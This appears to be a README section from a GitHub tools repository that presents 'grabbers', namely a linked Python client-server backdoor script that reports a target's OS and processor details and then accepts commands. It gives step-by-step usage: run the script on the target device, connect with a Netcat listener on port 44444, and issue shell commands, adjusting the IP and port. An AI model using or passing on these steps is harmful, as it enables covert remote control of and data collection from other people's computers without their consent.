# 🕵️‍♂️ Different Types of Grabbers:

- [my_backdoor.py](https://github.com/MoElaSec/Net_Tools/blob/main/Grabbers/my_backdoor.py) 🐍  client-Server Backdoor (Grabbes target OS info).

1. run script `python my_backdoor.py` on the target device.
2. on your machine run a listner (use Netcat or [My 🐍 client](https://github.com/MoElaSec/Net_Tools/blob/main/Client-Server/my_client.py))
 > $ nc  127.0.0.1 44444
3. you will recive Target (OS+Processor) then start executing commands.
 > $ cd .. && cd .. && dir 

##### make sure to modify the `IP + Port` givin in the code and above example.
